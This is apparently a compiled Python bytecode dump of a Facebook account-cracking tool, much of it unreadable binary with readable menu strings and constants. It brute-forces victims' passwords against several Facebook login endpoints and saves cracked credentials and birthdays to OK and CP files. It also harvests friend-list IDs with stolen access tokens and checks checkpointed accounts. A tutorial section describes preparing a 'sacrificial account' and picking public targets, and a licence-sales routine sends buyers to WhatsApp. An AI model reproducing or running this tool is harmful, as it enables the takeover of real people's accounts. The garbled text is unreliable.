}|�d| ji� qt�  t dttttf �}t	dt
 � |dv rOtdttttf � t�  d S |d	v r�t	d
ttttf � t dttttf �}|dv rztdttttf � t�  d S |dv r�t�  t�  td��| j| j� t�| j� t�  d S |dv r�t�  td��| j| j� t�| j� t�  d S tdttttf � t�  d S |dv �r<t	d
ttttf � t dttttf �}|dv r�tdttttf � t�  d S |dv �rt�  t�  td��| j| j� t�| j� t�  d S |dv �r-t�  td��| j| j� t�| j� t�  d S tdttttf � t�  d S |dv �r�t	d
ttttf � t dttttf �}|dv �ritdttttf � t�  d S |dv �r�t�  t�  td��| j| j� t�| j� t�  d S |dv �r�t�  td��| j| j� t�| j� t�  d S tdttttf � t�  d S tdttttf � t�  d S )Nu(   %s╠══[%s•%s] %sEnter Password : r�   r   rj  r=   r>   r?   rA   rB   rk  rl  �   ro  rK   r^   )rj   r:   r�   rj  r�   rv  ru  r  rx  r9   rl   r.   r�   rz   r{   ry  rz  r{  r|  r}  r6   r~  r`  rv   r	  r  r�  r�  r�  )r�  r�   r�  r�  r,   r,   r-   rv  �  s�   





















zcrack.pwlistc           
      C   s�  �z7|� d�D �]}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q
 ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q
|� d�dk�r	t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q
q|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nrj  r�   �https://b-api.facebook.comr�   r�   r�   r�   rH   r�   �birthday�/�$   %s[%sCP%s] %s • %s • %s %s %s%s�   %s•%s•%s%s%s�	CP/%s.txt�a+�   %s•%s•%s%s%s
r�   �   %s[%sCP%s] %s • %s%s     �   %s•%s�   %s•%s
r�   �   %s[%sOK%s] %s • %s%s     �	OK/%s.txtr   �1%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s��end)rp   r
  ro   rt   r�   rq   rr   rs   r�   �	bulan_ttlr9   rl   r{   rg  r�   r�   �tanggalr%   rx   ry   �Hrr  rs  r:   r�   ru  r#   r$   r&   r	  �
r�  ru  r�   �log�ke�tt�ttlrh  re   r�   r,   r,   r-   r	  <  sF   
�&. (("("Pz	crack.apic           
      C   s�  �z;|� d�D �]}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�rt
dttt|� d�|t|� d��f � t
d� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nrj  r�   r�  r�   r�   r�   r�   rH   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�   r�  r@   r�  r   r�  r�  )rp   r
  ro   rt   r�   rq   rr   rs   r�   r�  r9   rl   r{   rg  r�   r�   r�  r%   rx   ry   r�  rr  rs  r:   r�   ru  r#   r$   r&   r}  r�  r,   r,   r-   r}  `  sH   
�&. (("("Pzcrack.api_opsic                 C   s�  �z@|� d�D �]
}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�rdttt|� d�|t|� d��tf }
t|
t|� d��� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nrj  r�   r   r�   r�   r�   r�   rH   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�   �   %s[%sOK%s] %s • %s%s%s     r]   r�  r   r�  r�  )rp   r%  ro   rt   r�   rq   rr   rs   r�   r�  r9   rl   r{   rg  r�   r�   r�  r%   rx   ry   r�  ra  r\  rr  rs  r�   ru  r#   r$   r&   r�  �r�  ru  r�   r�  r�  r�  r�  rh  re   r�   r_  r,   r,   r-   r�  �  �H   
�&. (("&"Pzcrack.mbasicc                 C   s�  �zZ|� d�D �]$}t|� d�|d�}|� d�dkr�zst� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }dt
tt
|� d�||||	t|� d��f	 }
t|� d�||
� td� | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q- ttfy�   d}d}d}	Y n   Y dt
tt
|� d�|t|� d��f }
t|� d�||
� td� | j�d|� d�|f � tdt d��d|� d�|f �  �q-|� d�dk�r,dttt|� d�|t|� d��tf }t|t|� d��� td� | j�d|� d�|f � tdt d��d|� d�|f �  �q-q|  jd7  _tdt
tt
t| jt| j�t
tt| j�t
tt| j�t
tf dd� tj��  W d S    | �|� Y d S )Nrj  r�   r   r�   r�   r�   r�   rH   r�   r�  r�  r�  r@   r�  r�  r�  r�  r�   r�  r�  r�  r�   r�  r]   r�  r   r�  r�  ) rp   r%  ro   rt   r�   rq   rr   rs   r�   r�  rl   r{   rg  rU  r9   r�   r�   r�  r%   rx   ry   r�  ra  r\  rr  rs  r�   ru  r#   r$   r&   r  �r�  ru  r�   r�  r�  r�  r�  rh  re   r�   rJ  r_  r,   r,   r-   r  �  �R   
�&* ($"&"Pzcrack.mbasic_opsic                 C   s�  �z@|� d�D �]
}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�rdttt|� d�|t|� d��tf }
t|
t|� d��� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nrj  r�   �https://free.facebook.comr�   r�   r�   r�   rH   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�   r�  r]   r�  r   r�  r�  ) rp   r'  ro   rt   r�   rq   rr   rs   r�   r�  r9   rl   r{   rg  r�   r�   r�  r%   rx   ry   r�  ra  r\  rr  rs  r:   r�   ru  r#   r$   r&   r�  r�  r,   r,   r-   r�  �  r�  z
crack.freec                 C   s�  �zZ|� d�D �]$}t|� d�|d�}|� d�dkr�zst� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }dt
tt
|� d�||||	t|� d��f	 }
t|� d�||
� td� | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q- ttfy�   d}d}d}	Y n   Y dt
tt
|� d�|t|� d��f }
t|� d�||
� td� | j�d|� d�|f � tdt d��d|� d�|f �  �q-|� d�dk�r,dttt|� d�|t|� d��tf }t|t|� d��� td� | j�d|� d�|f � tdt d��d|� d�|f �  �q-q|  jd7  _tdtttt| jt| j�t
tt| j�t
tt| j�t
tf dd� tj��  W d S    | � |� Y d S )Nrj  r�   r�  r�   r�   r�   r�   rH   r�   r�  r�  r�  r@   r�  r�  r�  r�  r�   r�  r�  r�  r�   r�  r]   r�  r   r�  r�  )!rp   r'  ro   rt   r�   rq   rr   rs   r�   r�  rl   r{   rg  rU  r9   r�   r�   r�  r%   rx   ry   r�  ra  r\  rr  rs  r:   r�   ru  r#   r$   r&   r�  r�  r,   r,   r-   r�  �  r�  zcrack.free_opsiN)�__name__�
__module__�__qualname__r�  rv  r	  r}  r�  r  r�  r�  r,   r,   r,   r-   r�   W  s     L$%%*%r�   c               	   C   s�  z	t dd��� } W n ttfy!   tdttttf � t�  Y nw tdt	t	t	t	f �}zt
�d| d |  �}t�|j�}W n ttfyW   tdttttf � t�  Y nw z|d }W n ttfyk   d	}Y nw z|d
 }W n ttfy   d	}Y nw z|d }W n ttfy�   d	}Y nw z|d }W n ttfy�   d	}Y nw z|d }W n ttfy�   d	}Y nw z|d }	W n ttfy�   d	}	Y nw z|d }
W n ttfy�   d	}
Y nw z|d }W n ttfy�   d	}Y nw z|d }W n ttf�y   d	}Y nw z|d }W n ttf�y!   d	}Y nw z|d }W n ttf�y6   d	}Y nw z|d d }W n ttf�yM   d	}Y nw z|d d }W n ttf�yd   d	}Y nw z|d d }W n ttf�y{   d	}Y nw z|d }W n ttf�y�   d	}Y nw z|d }W n ttf�y�   d	}Y nw tdt	t	t	t	|f � tdt	t	t	t	|f � tdt	t	t	t	|f � tdt	t	t	t	|f � tdt	t	t	t	|f � tdt	t	t	t	|	f � tdt	t	t	t	|
f � td t	t	t	t	|f � td!t	t	t	t	|f � td"t	t	t	t	|f � td#t	t	t	t	|f � td$t	t	t	t	|f � td%t	t	t	t	|f � td&t	t	t	t	|f � td't	t	t	t	|f � td(t	t	t	t	|f � td)t	 � td*t	t	t	t	f � t�  d S )+NrH   r�   r�   r�   r�   r�   r�   rG   r�   r�   Zmiddle_name�	last_namer�  Zgenderr�   �linkr�   ZreligionZrelationship_statusZsignificant_other�locationZhometownZaboutr�   r�   u&   %s╠══[%s•%s] %sName Front : %su'   %s╠══[%s•%s] %sName middle : %su'   %s╠══[%s•%s] %sName Behind : %su   %s╠══[%s•%s] %sTTL : %su"   %s╠══[%s•%s] %sGender : %sr�   u    %s╠══[%s•%s] %sLink : %su$   %s╠══[%s•%s] %sUsername : %su$   %s╠══[%s•%s] %sReligion : %su/   %s╠══[%s•%s] %sRelationship status : %su-   %s╠══[%s•%s] %sRelationship With : %su%   %s╠══[%s•%s] %sResidence : %su+   %s╠══[%s•%s] %sPlace of Origin : %su!   %s╠══[%s•%s] %sAbout : %su!   %s╠══[%s•%s] %sLocal : %sr>   rb   )rt   r�   rx   ry   r.   rz   r{   rm   rj   r:   ro   rp   rq   rr   rs   r�   r9   )r�   ZidtZzxZzyZnmZnd�ntZnb�utZgdr  Zlk�usZrgZrlZrlsZlcZhtZab�lor,   r,   r-   r�   %  sr   0&0
r�   c               	   C   s�  t dttttf �} z%tdd��� }t�d| |f �}t�|j�}t	dtttt|d f � W n t
tfyG   tdttttf � t�  Y nw g }g }t dttttf �}t	d	ttf � t�d
| ||f �}t�|j�}|d D ]	}	|�|	d � qr|D ]K}
z<t�d|
|f �}t�|j�}z|d D ]	}|�|d � q�W n t
y�   t	d� Y nw t	d|
dt|�� |��  W q~ t
y�   t	d� Y q~w t	d� t d� t�  d S )Nr�   rH   r�   z-https://graph.facebook.com/%s?access_token=%sr�   rG   r�   u$   %s╠══[%s•%s] %sLimit Dump : u   %s║%sr�   r�   r�   z5https://graph.facebook.com/%s/friends?access_token=%su   ╠══[!] Privateu   ╠══[•]r�   u   ╠══[!] Spam Accountsu   ║u   ╚══[ Back ])rj   r:   rt   r�   ro   rp   rq   rr   rs   r9   rx   ry   r.   rm   rl   r{   r�   r�   r1   r�   )r�   r�   ZmmZnnr�  �teZlimrr  Zidir�   r�   Zada2Zidi2rN   r,   r,   r-   r�   a  sJ   
����
r�   c               	   C   s*  t �  t�  tdtttf � tdt � tdttttf � tdttttf � tdttttf �} | dv rFtdttttf � t	�  �n:| dv r�z|t
�d	�}tdt � td
tttf � tdt � |D ]}tdtttt|f � qgtdt � tdttttf �}td� |dkr�tdttttf � t�  t
�d| � td| ��� �� }d| �dd��dd�}tdtttt|t|�f � W n� ttfy�   tdtttf � Y n�w | dv �rsz}t
�d�}tdt � tdtttf � tdt � |D ]}tdtttt|f � q�tdt � tdttttf �}td� |dk�r1tdttttf � t�  t
�d| � td| ��� �� }d| �dd��dd�}tdtttt|t|�f � W n" ttf�yr   tdtttf � Y nw tdttttf � t	�  tdt � tdttttf � t	�  d S )Nu    %s╔══[ %sCrack Results %s]r>   u$   %s╠══[%s1%s] %sCHEEK RESULT OKu$   %s╠══[%s2%s] %sCHEEK RESULT CPr=   r?   u'   %s╚══[%s!%s] %sFill In Correctly rB   �OKu2   %s╠══[%s Crack Results Stored in File OK %s]u   %s╠══[%s•%s] %s%su)   %s╚══[%s•%s] %sEnter File Name : r@   u&   %s═══[%s!%s] %sFill In Correctlyz	cat OK/%szOK/%sz%sr�   r�   z.txtu@   
%s╔══[%s•%s] %sTotal Crack Result Date %s Is %s Accountu#   %s╠══[%s No Results Found %s]rK   �CPu3   %s╠══[%s Crack Results Stored in CP Files %s]z	cat CP/%szCP/%sra   rb   )r1   r;   r.   r:   r9   rl   r{   rj   rz   r�   r6   �listdirr�   r7   rt   r�   rt  r�   r�   rx   ry   )ZchZokl�filer�  ZpppZdel1Zcplr,   r,   r-   r�   �  sr   

 �


 �
r�   c                 C   s�  d}t �� }|j�dddtd|dddd	d
dtd ddd�� i }t|jtd d|id�jd�}|�dddi�}g d�}|�	d�D ]}|�d�|v rW|�|�d�|�d�i� q@q@|�| |d�� zt|j
t|�d� |dd�jd�}	W n t jjy�   tdttttf � Y nw d|jv r�td ttttf � d S d!|jv �r#|	�d�}
|
�ddd"i�d }|
�ddd#i�d }|
�ddd$i�d }||||d%d&|d'�}t|j
t|
d  |d(�jd�}d)d*� |�	d+�D �}tt|��d,kr�td-ttttf � ntd.tttttt|��f � tt|��D ]}td/t|d0 �d1 ||  � �qd S d2t|	�v �rC|	�d3d4d2i��d3�j}td5tttt|f � d S td6ttttf � d S )7Nz�Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36r  rP   rC   r�   r(  r)  r*  r+  r,  r-  r.  r  rO   r/  rR   r�   r  r0  r1  r  r2  rj   rG   r  r4  r5  Tr6  z%s[%s!%s] %sSpam Accountsr  u&   %s[%s•%s] %sAccount OK No Checkpointr  r  r3  r7  r@   r8  r9  r  c                 S   r:  r,   r;  r<  r,   r,   r-   r>  �  r?  zlog_hasil.<locals>.<listcomp>r@  rf   u   %s[%s•%s] %sOne Tap Accountu!   %s[%s•%s] %sThere is %s Option z   r   rA  rB  Zdivr�   z%s[%s!%s] %s%sz %s[%s!%s] %sPassword Has Changed)ro   r  r\   r  rT   rC  rp   rs   rD  rE  r  r|   rF  r9   rz   r{   r]   r:   r  r�   rl   rG  )rH  rI  r�   rK  r�   rL  rM  r   r�   rN  r0  rO  rP  r7  rQ  rR  rS  rT  Zohr,   r,   r-   �	log_hasil�  sx   �&�

�	"�r�  c               	   C   sj  t dtttf � tdt � tdtttttf � tdttttf �} z	t| d��� }W n t	yH   tdt
tt
tf � t�d� t�  Y nw tdtttttt|��f � td	� |D ]3}|�d
d	�}|�d�}tdtttt|f � zt|d |d � W n tjjy�   Y q^w td	� q^td	� tdttttf � tdt � tdttttf � t�  d S )Nu5   %s╠══[ %sCheck Crack Result Account Options %s]r>   u/   %s╠══[%s•%s] %sExamlle File : CP/%s.txtu   %s╠══[%s•%s] %sFile : r�   u#   %s╚══[%s!%s] %sFile Not Foundr�   u.   %s╚══[%s•%s] %sNumber of Accounts : %sr@   r!   r�   u   %s[%s•%s] %sCheck Login : %sr   r   u0   %s╔══[%s•%s] %sChecking Process Completerb   )r.   rl   r{   r9   r:   r�  rj   rt   �	readlines�FileNotFoundErrorrz   r'   r(   r�   r  r�   r�   r�   r�  ro   r|   r}   r�   )r�  Z	buka_bajuZmemekZkontolZtitidr,   r,   r-   r�   �  s6   �
�

r�   c               
   C   s�  t �  t�  tdtttf � tdt � tdttttf � tdttttf � tdttttf �} tdt � | dkrLtdttttf � t�  d S | dk�r@t	�
d	� t�� jd d
� �� }t�� jd d
� �� }t�� jd d
� �� }t�� jd d
� �� }tdd��|d | d | d | � t�d� tdttttttdd��� f � tdttttf � tdt � tdtttf � tdtttttf � tdtttttf � tdt � tdtttf � tdttttf �}tdttttf �}tdttttf �}tdd��� }d}	d| d | d | d | }
t�dd|	t|
� g� td� td ttttf � t�  d S | d!k�r�t	�
d	� d"}d#}td$ttttf �}t�|d% | d& | ��� }|d' d(k�r�tdd��|� tdt � td)ttttf � t�d*� t�  d S |d' d+k�r�tdd��|� tdt � td,ttttf � t�d*� t�  d S tdd��|� tdt � td,ttttf � t�d*� t�  d S tdttttf � t�  d S )-Nu#   %s╔══[%s Menu License Key %s]r>   u$   %s╠══[%s1%s] %sBuy License Keyu&   %s╠══[%s2%s] %sLogin License Keyr=   r@   rA   rC   zrm -rf license.txtr�   r�   rI   r�   r   u.   %s╠══[%s•%s] %sYour License Key : %s%sr�   uA   %s╠══[%s•%s] %sDon't Forget to Copy Then Save In Notepad!u)   %s╠══[ %sScript  Pro Price List %s]u7   %s╠══[%s•%s] %sDuration 1 Month Price %sTk 1000u;   %s╠══[%s•%s] %sPrice Unlimited Duration ℅sTk 2000u<   %s╠══[ %sFill in the License Key Registration Data %s]u   %s╠══[%s•%s] %sName : u   %s╠══[%s•%s] %sEmail : u"   %s╠══[%s•%s] %sDuration : z6https://api.whatsapp.com/send?phone=+96598064347&text=u:   hello admin, i want to buy elite pro script

[•] Name : u   
[•] Email : u   
[•] Durasi : u   
[•] Api Key : Zam�startz%s[ %sKembali %s]%srL   z/https://ngepetonline.000webhostapp.com/chek.phpZtestlicenceu+   %s╠══[%s•%s] %sEnter License Key : z	?project=z&apikey=r�   r   u-   %s╚══[%s!%s] %sLicense Key Unregisteredg      �?r�   u(   %s╚══[%s!%s] %sLicense Key Expired)r1   r;   r.   r:   r9   rj   rz   r{   r�   r6   r7   �uuidZuuid4�hex�upperrt   r%   r'   r(   rl   r�   �
subprocessZcheck_outputr   ro   rp   rq   )ZlzZid1Zid2Zid3Zid4Znamar�   ZdurasiZapikeyZurl_waZtksr�  Zproject�keyZcekr,   r,   r-   r�     s|   


(
" 









r�   c                  C   s�   zt dd��� } t�t|  �}t�|j�}|d }W d S  tjj	y4   t
dttttf � t�  Y d S    t
dttttf � t
dtttttttf � t
dttttf � t�  Y d S )Nr�   r�   r�   rJ   u)   
%s╔══[%s•%s] %sYou Are Free Useru;   %s╠══[%s•%s] %sTo Access Features %sPro%s/%sPremiumu3   %s╚══[%s•%s] %sPlease Buy License Key First)rt   r�   ro   rp   r�   rq   rr   rs   r|   r}   r.   rz   r{   rv   rl   )r�   Zowr#  �kr,   r,   r-   ry  ^  s   ry  c                   C   sr   t dtttf � t dt � t dttttf � t dttttf � t dttttf � t dttttf � d S )Nu   %s╔══[ %sLOGIN METHOD %s]r>   u%   %s╠══[%s1%s] %sLogin With Tokenu'   %s╠══[%s2%s] %sLogin With Cookiesu*   %s╠══[%s3%s] %sScript Usage Tutorialu   %s╠══[%s0%s] %sBackr8   r,   r,   r,   r-   ri   n  �   ri   c                   C   sr   t dtttf � tdt � tdttttf � tdttttf � tdttttf � tdttttf � d S )Nu"   %s╔══[%s Tips & Tutorial %s]r>   u&   %s╠══[%s1%s] %sHow to Take Tokenu(   %s╠══[%s2%s] %sHow to Take Cookiesu&   %s╠══[%s3%s] %sHow to Get Targetu4   %s╠══[%s4%s] %sHow to During the Crack Process)r0   r:   r9   r,   r,   r,   r-   r�   u  r�  r�   c                   C   s�   t dt � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t d	tttttf � t d
tttttf � t dt � tdt � d S )N��   %s╠═══╦══════════════════════════════════════════════════════╗uX   %s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process     %s║uJ   %s║ %s2 %s║ %sChange the Victim Account Password First           %s║uR   %s║ %s3 %s║ %sFind Random Account Targets, Friends List Must Be Public   %s║uM   %s║ %s4 %s║ %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %s║u=   %s║ %s5 %s║ %sMore Friends, More Possible Results   %s║uK   %s║ %s6 %s║ %sTap Target Profile/Cover Photo                      %s║uF   %s║ %s7 %s║ %sSee URL/Link at the top, there is 'id=10001xx' %s║u@   %s║ %s8 %s║ %sWell, thats a target ID ready to crack   %s║uN   %s║ %s9 %s║ %sOpen Termux/Linux then proceed to the Crack Process    %s║��   %s╠═══╩══════════════════════════════════════════════════════╝r>   �r0   rk   rl   r{   r9   r,   r,   r,   r-   r�   |  s   r�   c                   C   s�   t dt � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dt � td	t � d S )
Nr�  uJ   %s║ %s1 %s║ %sMetode Api : Fast But Easy Process Spam            %s║uQ   %s║ %s2 %s║ %sMetode Mbasic : Process is rather fast, rarely gets spam  %s║uB   %s║ %s3 %s║ %sMetode Mobile : Slow Process, Probably OK  %s║uD   %s║ %s4 %s║ %sCrack Using Data Quota (Not Support Wifi)    %s║uT   %s║ %s5 %s║ %sIf the results do not appear when the crack is running       %s║uN   %s║ %s6 %s║ %sTurn On Airplane Mode Only 5 Seconds                   %s║r�  r>   r�  r,   r,   r,   r-   r�   �  s   r�   c                   C   sF  t dtttf � t dt � t dttttf � t dttf � t dttf � t dt � t dttttttf � t dttf � t dttf � t d	ttf � t d
ttf � t dttf � t dttf � t dttf � t dttf � t dttf � t dttf � t dttf � t dttf � t dt � d S )Nu(   %s╔══[ %sAuthor & Team Project %s]r>   u   %s╠══[%s•%s] %sAuthor :u"   %s║     • %sDapunta Khurayra Xu)   %s║     • %sMuhamad Rizal Fiansyah Idu1   %s╠══[%s•%s] %sTeam Project %sXNSCODE%s :u   %s║     • %sAngga Kurniawanu   %s║     • %sYayan XDu   %s║     • %sBoy Hamzahu   %s║     • %sLatip Harkatu   %s║     • %sZacky Trickeru   %s║     • %sSutan Ubayu   %s║     • %sRizky Devu   %s║     • %sIqbal Devu   %s║     • %sAap Afandiu   %s║     • %sFallenu   %s║     • %sHanifanu   %s║     • %sRizky Leviathan)r0   rl   r{   r,   r,   r,   r-   r�   �  s(   r�   c                	   C   s�   t dttttf � t dtttttttf � t dtttttttf � t dttttf � t dttttf � t dttttf � d S )Nu(   %s╠══[%s1%s] %sDapatkan User Agentu4   %s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)u:   %s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)u%   %s╠══[%s4%s] %sHapus User Agentu#   %s╠══[%s5%s] %sCek User Agentu   %s╠══[%s0%s] %sKembali�r9   rl   r{   r,   r,   r,   r-   r�   �  s   r�   c                   C   sL   t dt � t dttttf � t dttttf � t dttttf � d S )Nr>   u   %s╠══[%s1%s] %sMetode Apiu"   %s╠══[%s2%s] %sMetode Mbasicu#   %s╠══[%s3%s] %sMetode Free FBr�  r,   r,   r,   r-   rx  �  s   rx  c                	   C   sr   t dt � t dtttttttf � t dtttttttf � t dtttttttf � t dttttf � d S )Nr>   u6   %s╠══[%s1%s] %sCrack Cepat %s[%sHasil Sedikit%s]u6   %s╠══[%s2%s] %sCrack Lambat %s[%sHasil Banyak%s]uC   %s╠══[%s3%s] %sCrack Sangat Lambat %s[%sHasil Lebih Banyak%s]u,   %s╠══[%s4%s] %sCrack Password Gabunganr�  r,   r,   r,   r-   rw  �  s
   rw  c                   C   sd   t dt � t dttttf � t dtttttf � t dtttttf � t dttttf � d S )Nr>   u/   %s╠══[%s•%s] %sCrack Sedang Berjalan...u6   %s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txtu6   %s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txtuK   %s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit
)r9   rl   r{   r�  r,   r,   r,   r-   rz  �  s
   rz  c                   C   s6   zt �d� W n   Y zt �d� W d S    Y d S )Nr�  r�  )r6   �mkdirr,   r,   r,   r-   �folder�  s   r�  �__main__zgit pull)gro   r  r#   r6   r  r'   r~   rq   r�  r�  r   Zconcurrent.futuresr   r{  r   rC  r   r   Zurllib.parser   r{   rz   r�  �K�B�Url   �Nr:   rk   r�   rT   �okr�   r�  ZnowZcurrentZyearZtaZmonthZbuZdayZhar�  Zbulanrv   ZbuTemp�
ValueError�opr�  r�   r�   r�   r�   r�   r�   r�   r�   r.   r0   r1   r;   rm   r�   rn   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r
  r%  r'  rU  r\  ra  rg  r�   r�   r�   r�   r�  r�   r�   ry  ri   r�   r�   r�   r�   r�   rx  rw  rz  r�  r�  r7   r,   r,   r,   r-   �<module>   s�   P
�rj
1$002>
   Q<$;?C



�